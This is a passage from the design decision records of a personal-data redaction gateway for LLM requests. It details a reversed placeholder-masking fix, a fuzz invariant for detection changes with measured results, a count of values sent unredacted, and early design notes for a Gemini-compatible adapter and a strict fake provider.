to one (ASCII, and the long s `ſ` that case-insensitive matching lets
stand for an `s` in IFSC, PASSPORT, SECRET and PERSON: NFKC makes it
`s`). A failed check throws, refusing the request (a 500), never reading
the wrong place. Each check is its own function, tested directly with bad
input, since by construction no request can reach a throw.

**Intended behaviour, not a side effect:** a type word inside a
placeholder acts as a keyword for a value near it, so `[AADHAAR_1]
12345678` may redact those digits, and `replace [AADHAAR_1] with <a
number that fails the check>` redacts the number. That is over-redaction,
the safe direction, and it is how detection behaved before masking.

**Measured.** The 1,200 probe values (keyword only inside a placeholder):
0 sent (masking alone sent all 1,200). Bug 61: fixed (`password: [pan
1]<value>` goes out as `password: [LITERAL_1][SECRET_1]`). A secret whose
keyword is only inside a placeholder (`[SECRET_1] = <value>`) is sent
before and after alike: the keyword secret needs its value directly after
the word, a documented limit, not this change. The guard held: the only
generated count that moved was the `glued-literal` echo (222 to 225).

**The cut-around stays.** With literals masked, detections still reach
into a literal's positions (keyword secret values, which run to the next
blank, filler included; a combining mark after a literal, which shares
the filler's cluster), so masking does not replace the cut-around; the two do
different things: masking keeps detectors from reading a literal, the
cut-around keeps a detection from covering one.

**New generated shape, `keyword-in-literal`: 96 cases, 12 per type**
(AADHAAR and CARD that fail their checks, a PAN that fails its check, an
IFSC at an unknown bank, a UPI ID at an unknown handle, PASSPORT, VOTER,
DOB): a value whose only keyword is the type word inside a placeholder,
in three spellings (`[TYPE_1]`, `[type 2]`, `[Type_3]`) and six layouts
(before and after the value), twelve distinct pairs per type, with no
filler sentence. Measured on scratch copies: today 0 of 96 sent; with the
masking-only version 93 sent; with the placeholder replaced by a word
that is no keyword, 93 sent (the other 3 are cards whose first 12 digits
pass the Aadhaar check: found without any keyword). Accepted as a changed
dataset.

### Amendment (2026-10-06/07): keywords read the original, placeholder characters count for nothing (bug-logs 63 and 64)

The first ADR-039 fuzz check of Part 1 (bug-log 63) found values the
code before masking redacted and the masked code sends, in three ways.
The user's decisions:

**1. The rule, for every detector: value matching reads the masked text;
keyword and context matching reads the original.** Part 1 applied this
to `hasContext` only, and the secret detector's own credential-word match
read the masked copy, so `[secret 3]_<value>` was sent (way 1): against
the "intended behaviour" above, so a bug, not a question. Now every
detector receives both texts, aligned (`detect()` passes the normalised
original beside the masked text), and every keyword or context word a
detector matches itself is read in the original: the secret detector's
credential word, its link and the quotes or brackets before the value;
the IP detector's version word. A detector added later that matches its
own keyword must do the same; this sentence is here so that it does not
reopen the hole.

**2. Placeholder characters contribute nothing to any rule: not length,
not evidence, not a boundary. A value ends wherever the original text has
a blank, including a blank inside a placeholder** (bug-log 64, the user's
H1). Masking had turned the space in `[UPI 2]` into the filler, so a
keyword secret's value ran across the placeholder, swallowing a later
keyword or digits the safety net needed. As built in `secret.ts`: the
value's stretch ends at the original's first blank; its length and the
digits-only code rule count only characters outside placeholders;
closing punctuation and evidence are read in the masked text, where the
filler is neither; placeholder characters after it do not stop it being
the last thing on its line; a value that would start inside a placeholder
starts after it.

**Ways 2 and 3 are accepted as this ADR's intended effect.** A value that
only passed a rule because placeholder characters were counted as part of
it (a secret long enough only with a placeholder's tail, a date that
reached the safety net's 9 digits only with a placeholder's index) was
never a detection. ADR-039's amendment makes that checkable.

**H2 not taken, and why.** Keeping blanks in the mask (a placeholder's
space stays a space) is the better structural answer: the masked text
would then end values where the original does, for every detector at
once. But it changes the input every detector reads, and that input
produced two rounds of surprises in one evening (bugs 63 and 64).
Contained beats elegant on a surface that keeps biting. If H1 turns out
to be the first of several boundary cases, H2 becomes the right answer,
and it is done deliberately, with this ADR's guard re-run.

**Other rules the mask could have moved (checked 2026-10-07).** No other
detector ends a value at a blank the mask can change: the blank inside
`[TYPE N]` sits between a letter and a digit, so it never joined digit
groups; glue checks at a value's edges see `[`, `]` and the filler alike;
email, UPI, IP and libphonenumber stop at both. One rule of a different
kind moved: the spaced-mobile table check numbers digit groups by
position on their line (ADR-027), and a placeholder's index digits were
a group before masking and are not now. That already follows rule 2;
whether it ever costs a value is not measured (neither the fuzz nor the
generated set has multi-line tables with placeholders in them).

**Result: stopped, 2026-10-07.** With 1 and 2 built, the ADR-039 check
(amended below) leaves 4 of 100,000 texts (names off) and 2 (names on)
classified real. All six are one cause, in the implementation of 1: a
value that would start inside a placeholder starts after it _and_ after
any punctuation that follows it (copied from how a cut around a literal
is displayed), so real characters (`@`, `=`, `)`, `.`, `/`) after the
placeholder count towards nothing: the reverse of rule 2. Not changed;
waiting for the user.

### Final amendment (2026-10-07): reversed; bug 61 left as a known limitation

**The arc, in order.**

1. **The original reasoning (2026-10-03).** Bug 61 (a credential word, a
   placeholder with a space, then the value: the value sent) looked like
   one case of a class: detectors reading placeholder-shaped text. The
   keyword secret took `[pan` as its value; the safety net joined a
   placeholder's digit to the number beside it; a placeholder's type word
   supplied another type's keyword. So detection was given a copy with
   every placeholder masked, rather than a patch to one detector.
2. **Round 1 (the first ADR-039 fuzz check, bug-log 63):** masking also
   hid keywords the user wrote inside placeholders. Option 1 gave them
   back to `hasContext`, but not to the detectors that match their own
   keywords, and 161 of 100,000 texts (names off) sent a value the code
   before redacted, in three ways.
3. **Round 2 (bug-log 64):** with keywords read in the original
   everywhere, the masked filler turned out to change where a value ends
   (a placeholder's space became non-blank), and the classifier's first
   witness misjudged way 2. Rule 2 (placeholder characters count for
   nothing, a blank inside one ends a value) and a two-witness classifier
   (ADR-039 amendment) followed; 4 and 2 texts were left, from the way-1
   code discarding real punctuation.
4. **Round 3 (bug-log 65):** with that fixed and tables added to the
   fuzz, 357 and 309 texts failed: masking had moved the spaced-mobile
   column count (ADR-027), which neither the fuzz nor the generated set
   could see until then. Adding one fuzz shape took the count from 4 to 357.

**Five kinds of unintended change**, all from the masked input: keywords
inside placeholders hidden (way 1); real characters after a placeholder
counted for nothing (the punctuation trimming); a value running across a
masked blank and swallowing a later keyword (bug 64; kind 2 of bug-log 65);
the table columns moved (bug-log 65); the safety net's coverage changed
by a different winner once a placeholder's digit no longer joined (kind
4 of bug-log 65).

**Its own rules came to contradict each other.** Rule 2 says a blank
inside a placeholder ends a value; judging a value from after the
placeholder, which bug 61's fix needs, makes the value run past that
blank. In `API_KEY =  [IFSC 3]=was=…)API_KEY =)<PAN>` the first value then
swallows the second keyword and a real PAN is sent.

**The class it generalised over proved to be two detectors.** Of all the
detectors, only `secret.ts` (its credential words) and `ip.ts` (its
version word) match a keyword of their own; every other keyword is read
by `hasContext`. Masking changed the input of every detector to fix two.

**The reversal (the user's option C, 2026-10-07).** The masking was
undone (`detect.ts`, `normalise.ts`, `redact.ts`, `ip.ts` back to
9ec51b7), and bug 61 fixed in `secret.ts` alone, by its original option
1: when the brackets before a keyword's value open a placeholder (the
ADR-002 grammar), skip it and read the value after it.

**Option 1 failed too.** The ADR-039 check against 9ec51b7: 19 texts
(names off) where a value is now found, the intended change; but 6 where
a value is now sent (after a placeholder with no space, `[Phone_8]`, the
value used to reach the secret rule's 6 characters with the placeholder's
tail and be covered by the cut-around; read after it, it is too short),
and, names on, 2 real regressions: the `API_KEY` case above. That
swallowing was never the masking's: **any fix that reads the value after
the placeholder has it**, so it is the shape of the problem rather than a
detail to route around.

**Decision (the user's option O2): bug 61 is not fixed.** `secret.ts` is
back to 9ec51b7 too, so detection is identical to 9ec51b7 and the ADR-039
check shows no difference at all by construction: 0 of 100,000 texts with
any replaced span different, names off (seed 39) and names on (seed 40);
the negative control (the masking code) fails, 3,494 texts different, 442
with a real regression. Bug 61 is a known limitation, stated with its
count in the README and the user manual: **3 of 108 values in the
generated `glued-literal` shape** are sent. Both shapes the masking added
to the generated set stay: `glued-literal` (with those 3) and
`keyword-in-literal` (96 of 96 redacted, since 9ec51b7 reads a keyword
inside a placeholder anyway). The echo baseline moved by those 3 values'
placeholders (`glued-literal` restored 225 to 222), accepted with a note.

**O1, priced and not taken.** Read the keyword's value exactly as 9ec51b7
does, and when a placeholder opens it, also try the value after the
placeholder as a second candidate, resuming the keyword search after the
first, so no keyword is swallowed. What it would cost and was not
measured: a second SECRET candidate over text the first did not claim,
whose overlap with other detections could change their coverage (the
kind-4 mechanism); a rule in one detector that exists only for
placeholder-shaped text. What it would buy: the 3 values. Anyone returning
to this starts from the fuzz (`scripts/fuzz-detection-change.ts`, tables
included) and this record: two fixes of different shape each did worse
than the bug, and the stopping condition fired twice.

<a id="adr-039"></a>

## ADR-039: Standing requirement: a change to the detection path is checked by fuzz for "nothing redacted before is sent now" (2026-10-03)

**Status.** A standing requirement, set by the user.

**Requirement.** Any change to the detection path (a detector, the
pipeline in `detect()`, normalisation, `redactMessage`, the literal
handling, the name path) is checked, **against fuzz rather than the
generated set**, for one invariant: **nothing the code redacted before the
change is sent after it.** The check runs the code before and after the
change (scratch copies of `src/`, never `git stash` or `git checkout`) on
generated random texts built from pieces that combine values, keywords,
placeholder-shaped text, separators, joiners, combining marks, invisible
characters and characters that normalisation expands or merges, and
counts texts where a value (or any character of it) went out after the
change but not before. Any such text is a finding to explain before the
change goes on; the generated counts passing is not enough.

**Why: the generated set only sees shapes it already contains.** Its
counts move only for texts like the ones written into it, and three times
now a real change in what is sent was invisible to them:

1. **Bug 58's class:** values glued to placeholder-shaped text were sent
   whole, and the eval was green; the fix changed 9,089 of 100,000 fuzzed
   texts and no generated count (bug-log 58).
2. **The glued-literal shapes themselves:** they had to be added to the
   generated set after the fact (ADR-037), and the first draft still
   measured the wrong thing for two templates until a fuzz-style check
   compared them with and without the literal.
3. **The 1,200:** masking literals hid keywords written inside them, and
   1,200 of 1,200 probed values that had been redacted were sent, with no
   generated count moving (bug-log 61, ADR-038).

**Consequence.** The fuzz is part of the evidence for a detection change,
reported with it (texts, what changed, what was sent that was not
before). New generated shapes are still added for every class it finds,
so that the eval guards the class from then on.

### Amendment (2026-10-07): one exception, placeholder-derived coverage, enforced by a classifier

**Made after the measurement, and said so.** The first run of this check
on ADR-038 found values that were redacted before and are sent now
(bug-log 63). This amendment changes the rule after it gave an
inconvenient answer, which is the shape of moving a goalpost. So the
exception is checkable, not asserted, and it **narrows** what counts as
acceptable rather than widening it: before, any "sent now" case was to be
explained in prose; now each one must pass a mechanical test, and
anything that does not pass it fails the check.

**The exception.** A character of a planted value that the code before a
change covered and the code after sends is acceptable only if it is
**placeholder-derived**: every detection that covered it before
contained characters of placeholder-shaped text (a literal, ADR-002),
and the before-code no longer covers it when exactly those characters,
and no others, are taken out of its reach (ADR-038: a value that only
passed a rule because placeholder characters were counted as part of it
was never a detection). Everything else is a **real regression**, and
one fails the check.

**The enforcement: `scripts/fuzz-detection-change.ts`.** It fuzzes texts
as this ADR lists, redacts each with the code before and after, and
classifies every value character that was covered and is sent now. "Taken
out of its reach" is tested by two witnesses, run on the before-code:

- **filled**: those characters become the ADR-038 filler. Shows way 3 (a
  placeholder's digit joined into a number). Alone, it misses way 2,
  because the before-code counts the filler towards a secret's length.
- **deleted**: those characters are removed. Shows way 2 (a secret long
  enough only with a placeholder's tail). Alone, it misses some of way 3,
  because deleting puts their neighbours side by side.

A case is placeholder-derived if either witness removes the coverage.
**This rule was chosen after two single-witness versions failed**:
filled-only called 13 (names off) and 8 (names on) way-2 texts real;
deleted-only called 15 other texts real, mostly way 3. Neither witness
changes a keyword outside the detection, the rest of a placeholder
included, so a keyword inside a placeholder that the after-code fails to
honour is never explained away.

**Two conditions (the user's).** Every run prints how many values each
witness explained, and how many only it explained; if one explains
nothing while there are placeholder-derived cases, the run says the rule
has collapsed into the other. And the negative control stays: run against
the code before ADR-038's way-1 fix, the check must fail. It does: 78 of
100,000 texts with a real regression (names off, seed 39; exit 1).

**First runs (2026-10-07; after = ADR-038 amendment rules 1 and 2;
before = the commit before ADR-038, 9ec51b7):**

|                                             | names off (seed 39) | names on (seed 40) |
| ------------------------------------------- | ------------------- | ------------------ |
| texts, a value redacted before and sent now | 103                 | 81                 |
| every character placeholder-derived         | 99                  | 79                 |
| with a real regression                      | **4**               | **2**              |
| values explained: filled / deleted / both   | 89 / 91 / 80        | 73 / 70 / 63       |
| texts, a value sent before and redacted now | 99                  | 79                 |

The check fails. The six real regressions have one cause, read from their
traces: the way-1 implementation discards real punctuation after a
placeholder before judging a value (ADR-038 amendment, "Result"). They
are not ways 2 or 3 and were not explained away. Stopped for the user.

**The classifier is only as strong as the shapes the fuzz generates
(2026-10-07).** ADR-038's masking changed a rule nothing here could see:
the spaced-mobile table check numbers digit groups by position on their
line (ADR-027), and a placeholder's index digits were a group before
masking and are not now. Neither the fuzz nor the generated set had a
table with a placeholder in it, so the check passed that change
silently. This is the fourth time the test data's coverage has been the
limit: bug 58's class, the glued-literal shapes, the 1,200 keyword-only
values (above), and now tables. The fuzz now builds tables (rows of
spaced mobiles, 5-digit amounts, placeholders, short numbers and words,
most rows in one column layout). A pass of this check says nothing about
shapes the generator does not build.

**Second runs (2026-10-07; the punctuation fix and tables added):**

|                                             | names off (seed 39) | names on (seed 40) | negative control (names off) |
| ------------------------------------------- | ------------------- | ------------------ | ---------------------------- |
| texts, a value redacted before and sent now | 438                 | 370                | 520                          |
| every character placeholder-derived         | 81                  | 61                 | 78                           |
| with a real regression                      | **357**             | **309**            | 442                          |
| values explained: filled / deleted / both   | 79 / 79 / 72        | 59 / 58 / 55       | 79 / 75 / 72                 |
| texts, a value sent before and redacted now | 1,777               | 1,806              | 1,801                        |

The check fails. Almost every real regression is a spaced mobile in a
table whose columns moved (bug-log 65): before masking, a placeholder's
index digits counted as a column, so masking shifts a row's columns
against the rows beside it, and a mobile loses (or, about four times as
often, gains) its validation. Outside tables, 3 texts (names off) and 2
(names on) remain, of four kinds (bug-log 65). Stopped for the user.

**A limitation of the deleted witness, found by using it (2026-10-07).**
Deleting characters puts their neighbours side by side, and that can
create text that was never in the input. In `[SECRET 10]=<card>` the
before-code's value reached 6 characters only with the placeholder's
`10]` (way 2); deleting those leaves `[SECRET =<card>`, in which
`SECRET =` reads as a keyword with `=`, an assignment the user never
wrote, so the before-code still covers the value and the witness says
"not explained" (bug-log 65, kind 3). It errs towards calling a case real,
never towards excusing one, but a case it misjudges this way fails the
check for a reason that is not in the text. The filled witness has the
opposite limit (the before-code counts the filler towards a length).
Either result is evidence to read, not a verdict to trust blind.

**Outcome for ADR-038 (2026-10-07).** ADR-038 was reversed (its final
amendment): detection is the code of 9ec51b7 again, and this check
against 9ec51b7 shows nothing at all: 0 of 100,000 texts whose replaced
spans differ in any position or type, names off (seed 39) and names on
(seed 40). The negative control, the masking code as "after", fails:
3,494 texts different, 442 with a real regression. The script now also
prints, on every run, how many texts differ in any replaced span, so that
"no difference" means the whole output and not only the planted values;
and `--list` prints every value whose coverage differs, either way.

<a id="adr-040"></a>

## ADR-040: The evaluation counts the personal values sent as written (2026-10-07; accepted, committed before it is measured)

**Status.** Accepted by the user on 2026-10-07, with two additions (the
measurement boundary and the blind spot, below). By the project's rule
for measurements, this entry is committed before the count is built or
run: nothing here has been measured at the commit that adds it. It is
ADR-038's Part 2, which was named there and never started.

**Context.** Every detection score in the evaluation (`eval/score.ts`)
measures what `detect()` finds: a value counts as redacted when its
characters lie inside a detection. That is not what is sent. What is
sent is `redactMessage`'s output, which also cuts detections around
placeholder-shaped text the user typed (ADR-002, bug-log 58) and keeps
that text as literals. Twice the two came apart and the scores could not
see it: **bug 58**, a value glued to a typed placeholder was detected,
then dropped with the literal and sent whole, while `detect()`'s score
counted it redacted; and **bug 61**, where the generated set's
`glued-literal` shape needed the echo (ADR-033) to show the change at
all. The promise is about what leaves the network ("every personal value
Pseudonym detects is replaced before the request leaves"), so the
evaluation must count that, beside the detection scores.

**Decision.**

1. **The count.** For every case of the generated set (main cases and
   every shape) and of the held-out set: redact its messages in order
   with one mapping, as the gateway redacts a request (`redactMessage`).
   For every piece the slot format marks as personal (any type but
   `NOT`), take the piece's text exactly as written in its message, and
   check whether it appears, character for character, anywhere in that
   message's redacted text. Count, per part: personal pieces, and pieces
   **sent as written**.
2. **Only labelled personal values.** Lookalikes (`NOT` slots) are meant
   to pass through, and counting all text would let them poison the
   count. A personal value whose text also occurs elsewhere in its
   message counts as sent if that other occurrence is sent: the count
   errs towards a leak.
3. **Verbatim only, and said so.** A value partly replaced (a placeholder
   over some of its characters) is not counted here; the detection
   scores' "partly redacted" column counts those, on `detect()`. The
   no-leak test (Phase 3) checks more forms (without separators,
   lower-cased); this count is the published, per-shape number.
4. **Parts and thresholds.** Generated: `main`, then each shape;
   held-out: one total, counts only, as the echo is. In
   `eval/baseline.json` beside the echo, held like every other count:
   sent may only go down; a changed number of personal pieces is a
   changed dataset. The first run is recorded as a changed dataset, with
   an ADR-040 note.
5. **Known-failing, marked explicitly.** `eval/baseline.json` gets a
   hand-written list, `knownFailing`: each entry names a part, the number
   of values sent there that are known and accepted, and why (the first:
   `glued-literal`, 3, bug-log 61, ADR-038's final amendment). Every run
   checks each entry against the measured count of its part and fails,
   naming the entry, if they differ, in either direction, `--update`
   included: a change that fixes bug 61 (or makes it worse) must edit
   the entry on purpose, so someone notices. The list is kept across
   updates; nothing writes it but a person.
6. **Reported** in `npm run eval` and in the README's generated block,
   a table of sent values by part, known-failing parts marked; and the
   README states that the detection scores measure `detect()`, not what
   is sent, that this was found through bugs 58 and 61, and that this
   count is the one that measures the promise.

**The measurement boundary.** The count reads `redactMessage`'s output.
That is one step short of the bytes that reach the provider: the gateway
still builds the request body from it (`src/gateway/redact-request.ts`,
the placeholder instruction when it is on, the adapter's JSON). That last
step is asserted on raw bytes by the gateway tests: the no-leak and
canary tests (`test/integration/`) capture every byte sent to a mocked
provider. Both are needed, and they measure different things: this count
measures, per shape and on both datasets, how many labelled values the
redaction lets through; the gateway tests prove that what the redaction
produced is what is sent, and that no other path (errors, logs,
streaming) puts a value back. A pass here says nothing about the request
body; a pass there says nothing about values the detectors miss.

**The blind spot, named before it is found.** Verbatim matching catches a
whole value being sent. It does not catch a value sent **partly**: a
placeholder over some of its characters and the rest left as text. That
is exactly the class of the invisible-character bypass (ADR-036, ADR-037):
a value split by invisible characters, or a name the finder covers only
in part, goes out in pieces, no piece is the whole value, and this count
reads it as not sent. The detection scores' "partly redacted" column
sees that class on `detect()`'s output, not on what is sent; nothing in
the evaluation counts it on what is sent. A count that did would check,
for each value, whether any of its required characters (the `required`
offsets of its slot) survive into the output.

**Expected, not predicted.** Every value the detectors miss is sent as
written, so the parts with known detection gaps (values split across
messages, person names while names are off, short IDs with no keyword,
values written with a line break the detectors do not join) will show
values sent. The count is published as measured; only `glued-literal`'s 3
are marked known-failing, because they are the one class that was
detected-adjacent and deliberately left (ADR-038).

**Options not taken.** Counting characters rather than values (the
user's specification is values); matching normalised forms (the no-leak
test does that; this count is meant to be the plain reading, "is the
value in the text that left").

**First measurement (2026-10-07, after this entry was committed in
58229f2).** Built as written: `eval/sent.ts` (`sent`, `sentByShape`,
`knownFailingMismatches`), the parts shared with the echo
(`casesByPart`), `compareSent` and the kept `knownFailing` list in
`eval/baseline.ts`, `sentTable` and the README text in `eval/report.ts`,
wired in `eval/run.ts`. Accepted as a changed dataset with an ADR-040
note. Values sent as written: generated main 198 of 1,683 (the 153 person
names, which are not detected with names off, and 45 others, exactly the
198 the main score table shows as neither redacted nor partly);
line-break 7 of 120; message-split 118 of 120 pieces (60 values, each in
two pieces; the other 2 are the 2 partly redacted, which a verbatim count
cannot see); short-id 154 of 459; names 612 of 612; **glued-literal 3 of
108, the known-failing entry**; every other shape 0; held-out 55 of 120
pieces (reporting only, not investigated). Every generated part counted
in whole values equals its detection row's values neither redacted nor
partly redacted; message-split, counted in pieces, agrees (58 undetected
values in two pieces each, plus one piece of each of the 2 partly
redacted). On today's generated set nothing detected is lost on the way
out. The known-failing check
was shown to bite: with the entry set to 4 the run failed, `--update`
included (`known-failing glued-literal: the entry says 4 sent, measured
3`), and passed again at 3.

<a id="adr-041"></a>

## ADR-041: Phase 7, the second provider: Gemini's OpenAI-compatible endpoint, and a strict fake provider (2026-10-07; in progress)

**Status.** Records 1 to 3 are decided (the user, 2026-10-07). The
reading (7a) and the strict fake provider's design follow; the adapter
design is proposed with options and **waits for the user**. Nothing has
been sent to Gemini.

### 1. Why Gemini, and what that makes the result (recorded before any call)

**OpenAI was the preferred provider.** It is the reference implementation
of the format this gateway speaks: a difference found there is a
difference from the specification, while a difference found on Gemini may
be one compatibility layer (Gemini's) disagreeing with another (Ollama's).
**It was not used because it costs money**; this phase uses no paid API
(the user, 2026-10-07). **Gemini's OpenAI-compatible endpoint, on its free
tier, is used instead.** So every Phase 7 result is **measured against a
compatibility layer, not the reference**, and is labelled that way wherever
it appears: "works with Gemini's OpenAI-compatible endpoint" is claimed;
"works with OpenAI" is not, until it is measured against OpenAI.

**The second check is a strict fake provider in the test suite**, free and
offline: a provider that follows the OpenAI specification strictly and
rejects or sends what a lenient layer would let slide, so that a place
where Ollama and Gemini happen to be lenient in the same way is still
caught (section 4).

### 2. What is sent to a third party (recorded before any call)

**Every request this phase sends to Gemini carries synthetic data only**,
by ADR-009: generated in memory from fixed seeds (`src/synthetic/`), the
published test-card list, reserved example domains (`example.com`),
documentation and private address ranges, fictional phone ranges, and
names drawn from Wikidata at random, never a real person's details. No
real personal data has ever been in this repository's tests, fixtures or
datasets (rule 4), so none can be sent. This is said here, before the
first call, because "you sent your test data to Google" is a fair question
to ask of a privacy gateway, and the answer has to have been true before
it was asked. Two further points: what reaches Gemini is the gateway's
**redacted** request (placeholders, not even the synthetic values), except
in a deliberate measurement of the provider itself, which is said where it
happens; and Gemini's free tier may use what it receives to improve
Google's products (to be quoted from Google's current terms in the reading,
section 3), which is acceptable only because the data is synthetic.

**What the calls disclose about the project itself** (added 2026-10-07,
before the live run): every call is attributable to the Google account
that owns the API key and to the public IP address of the machine that
makes it. The request headers that leave the machine are measured, not
assumed (section 10).

### 3. The dashboard: deferred, not dropped (decided in conversation on 2026-10-04, recorded now)

The project brief's Phase 7 had two parts: a second provider and a small
page showing a request before and after redaction. **The page was deferred
on 2026-10-04 in conversation and never written down; this records it.**

- **Deferred, not dropped.** It is the weakest evidence for what this
  project claims (a page that shows redaction working on chosen examples
  proves nothing the measured evaluation does not, and suggests more than
  it measures), and in a privacy gateway it adds surface area where values
  can escape (a page that displays requests is a page that can leak them).
- **If it is ever built:** it shows **counts only, never message
  content**; it is **off by default**; and it comes **after Phase 8**.
- The project brief's Phase 7 line is updated to match.

**Note (2026-10-10, ADR-045).** The first sentence's "a request before
and after redaction" conflicts with this section's own constraint, since
a request before redaction is message content. ADR-045's ruling resolves
the conflict in favour of the constraint. "Before and after" is ruled out
as message content, and the dashboard, if built, renders the committed
evaluation results (option 5). The wording above is left as written. The
timing and "off by default" are unchanged.

### 4. 7a: Gemini's documentation against what the Ollama adapter assumes (read 2026-10-07)

Sources, read on 2026-10-07: "OpenAI compatibility"
(`ai.google.dev/gemini-api/docs/openai`, last updated 2026-09-02), "API
errors" (`…/docs/api-errors`, 2026-09-20), "Rate limits"
(`…/docs/rate-limits`, 2026-09-02), the Gemini API terms
(`…/gemini-api/terms`, last modified 2026-04-28). Google itself calls the
OpenAI compatibility "still in beta". The documentation is thin on exactly
the things this adapter depends on, so **most rows end in "measure in
7b"**: nothing below is assumed from silence.

| Area                | What `ollama.ts` assumes (from Ollama's source and a recorded stream)                                                                                                                                                                            | What Gemini's documentation says                                                                                                                                                                                                                         | Difference, or what 7b must measure                                                                                                                                                                                                                                                                                                                                                                                                   |
| ------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Endpoint            | `{base}/chat/completions`, base `http://localhost:11434/v1`                                                                                                                                                                                      | base `https://generativelanguage.googleapis.com/v1beta/openai/`                                                                                                                                                                                          | Configuration only; the URL join already handles the trailing slash.                                                                                                                                                                                                                                                                                                                                                                  |
| Authentication      | `Authorization: Bearer <key>`, sent only when a key is set (local Ollama needs none)                                                                                                                                                             | `Authorization: Bearer $GEMINI_API_KEY`                                                                                                                                                                                                                  | Same header. Gemini **requires** a key: a missing key is a 401, mapped like any provider status. The key comes from `.env` (`PSEUDONYM_PROVIDER_API_KEY`) and is never logged.                                                                                                                                                                                                                                                        |
| Request fields sent | `model`, `messages` (role, content), `stream`, `stream_options.include_usage`, `temperature`, `top_p`, `max_tokens`, `seed`, the two penalties, `reasoning_effort`, `response_format` (`text`/`json_object`), `stop` (≤ 4)                       | Documented: `model`, `messages`, `stream`, `reasoning_effort`, `response_format`, `temperature` and `max_tokens` in examples, `stream_options.include_usage` in one example. **Not documented:** `top_p`, `seed`, the penalties, `stop`, `n`, `logprobs` | For each undocumented field, 7b sends it once and records whether it is honoured, ignored or rejected. **Silently ignored** would matter: a client sending `seed` for repeatable answers would not get them. Not assumed either way.                                                                                                                                                                                                  |
| `reasoning_effort`  | Forwards any of `none, minimal, low, medium, high, xhigh, max` (ADR-014's schema)                                                                                                                                                                | Accepts `minimal, low, medium, high, none`; `none` turns thinking off only for 2.5 models ("cannot be turned off for Gemini 2.5 Pro or 3 models"); unset means the model's default                                                                       | **`xhigh` and `max` are outside Gemini's set** (rejected or ignored: measure). Thinking may be **on by default**, so a first token can come late (the per-wait timeout, 120 s by default, must cover it: measure) and thinking may use the `max_tokens` budget.                                                                                                                                                                       |
| Thoughts in output  | Drops `reasoning` (Ollama's thinking field) and keeps `content` only                                                                                                                                                                             | Thought summaries appear only when asked for through `extra_body.google.thinking_config.include_thoughts`, which the gateway never sends                                                                                                                 | Expected: no thoughts in `content`. Measure that `content` carries only the answer.                                                                                                                                                                                                                                                                                                                                                   |
| Response fields     | `id`, `created`, one choice with `message.content` a **string**, `finish_reason` in `stop / length / content_filter`, optional `usage`; extra fields are dropped                                                                                 | Not specified beyond "OpenAI format"                                                                                                                                                                                                                     | Measure: whether `id` and `created` are present, whether `content` can be **null** (a blocked or empty answer), which `finish_reason` values appear.                                                                                                                                                                                                                                                                                  |
| Finish reasons      | `stop`, `length`, `content_filter`; anything else is `bad_response` (a 502)                                                                                                                                                                      | Gemini's own block reasons: `safety`, `recitation`, `spii`, `blocklist`, `prohibited_content` (and the native API has `MAX_TOKENS`, `OTHER`)                                                                                                             | How these map onto OpenAI's values on this endpoint is **undocumented**: measure. **`spii` matters to this project**: Gemini can block a generation for "Sensitive Personally Identifiable Information". The gateway sends placeholders, so this should be rare; measure.                                                                                                                                                             |
| Stream shape        | `data:` chunks; first with `delta.role`; `delta.content` string or empty; a chunk with `finish_reason`; with `include_usage`, a `choices: []` chunk with `usage` after it; **`data: [DONE]` required** (a stream ending without it is a failure) | "standard OpenAI-format chunks"; `include_usage` shown in one example                                                                                                                                                                                    | **The most important thing to measure**: whether `[DONE]` is sent (if not, every Gemini stream fails today), whether usage arrives once and after the finish (usage twice, or before the finish, is `bad_response` today), the content type `text/event-stream`.                                                                                                                                                                      |
| Mid-stream error    | An OpenAI-style `data: {"error": …}` event is a `stream_error`; Ollama itself ends without `[DONE]`                                                                                                                                              | The errors page mentions errors in SSE with `"event_type": "error"`, not specifically for this endpoint                                                                                                                                                  | Measure if possible; a provoked error mid-stream may not be reproducible on demand. An error event that is not `{"error": …}` would parse as a bad chunk: a failure either way, but named `bad_response`.                                                                                                                                                                                                                             |
| Error responses     | Any non-2xx is `http` with the status; the body is never read (it can echo the prompt)                                                                                                                                                           | `{"error": {"code", "message"}}`; 400, 401, 402, 403, 404, 429, 503                                                                                                                                                                                      | Nothing to change: the body is still never read. **402** (prepaid credit) cannot occur on the free tier. **Measured (section 10, attempt 1): the body is a JSON array, `[{"error": {"code", "message", "status"}}]`**, where the specification has the object `{"error": {…}}`. Nothing breaks today, because the adapter never reads error bodies; anything that ever surfaces provider error text would have to handle both shapes. |
| Rate limits         | Not considered (local Ollama has none)                                                                                                                                                                                                           | RPM, input TPM, RPD; RPD resets at midnight Pacific; exceeding one returns `429 RESOURCE_EXHAUSTED`; "wait and retry". Free-tier numbers are shown only in Google AI Studio                                                                              | **A 429 is mapped to our 502 today**, with no retry information for the client. Whether to map it to a 429 or 503 with `Retry-After` is a decision for later (not in this ADR). The free-tier limits bound how many measurement calls 7c can make per day.                                                                                                                                                                            |
| Data use            | Local: nothing leaves the machine                                                                                                                                                                                                                | Unpaid Services: "Google uses the content you submit … to provide, improve, and develop Google products"; "human reviewers may read, annotate, and process your API input and output"; "Do not submit sensitive, confidential, or personal information"  | Consistent with section 2: only synthetic data, and normally only placeholders. Recorded so the choice is visible.                                                                                                                                                                                                                                                                                                                    |

### 5. The strict fake provider (designed in 7a, built with the adapter)

A provider in the test suite that follows the OpenAI chat-completions
specification **to the letter on both sides**. Its job is the one neither
real provider can do: catch places where Ollama and Gemini happen to be
lenient in the same way, so a fault in the gateway passes both. Built from
the specification, not from either provider's behaviour.

**Strict about what the gateway sends** (each a 400 from the fake, which
fails the test):

- Only fields the specification defines; any other top-level field.
- `stream_options` without `stream: true` (the adapter should never send
  it; both real providers may ignore it).
- More than 4 stop sequences; `max_tokens` and `max_completion_tokens`
  together; a `reasoning_effort` outside the specification's values;
  `response_format` of any shape but `{type: "text" | "json_object"}`.
- Messages: a role outside `system`, `user`, `assistant`; content that is
  not a string; a `name` field (the gateway rejects them earlier; the fake
  proves none slips through).
- Headers: exactly `Authorization: Bearer <key>` and
  `Content-Type: application/json`; and **no client header forwarded**
  (none of the test client's own headers may arrive).
- The body: valid UTF-8 JSON without duplicate keys.

**Strict, and complete, in what it sends** (everything the specification
allows, which lenient providers mostly omit):

- Non-streamed: `object`, `model`, `system_fingerprint`, `service_tier`,
  `message.refusal: null`, `message.annotations: []`, `logprobs: null`,
